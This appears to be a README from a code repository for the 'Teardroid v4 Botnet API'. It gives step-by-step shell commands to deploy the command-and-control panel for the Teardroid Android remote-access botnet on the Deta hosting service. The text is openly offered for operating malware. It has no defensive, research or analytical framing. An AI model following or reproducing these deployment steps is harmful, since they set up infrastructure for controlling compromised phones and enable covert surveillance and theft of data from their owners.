# Teardroidv4_api
Teardroid v4 Botnet API

This api is for teardroid v4 botnet

Please visit https://github.com/ScRiPt1337/Teardroid-phprat to know about teardroid and how to use it

### Deploy the Teardroid control panel

- Set up an account at [deta.sh](https://web.deta.sh/)
- Install [Deta Cli](https://docs.deta.sh/docs/cli/install)
- Logging in to Deta via the CLI
- Create a new Python Micro using the command below

```bash
$ deta new --python teardroid_control # its will create an teardroid_control folder
```

- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below

```bash
$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
```

- Move all Teardroidv4_api Files to teardroid_control folder using the command below

```bash
$ cd Teardroidv4_api
$ cp -r * ../teardroid_control/
```

- Deploy the Control panel using the following command.

```bash
$ deta deploy
```
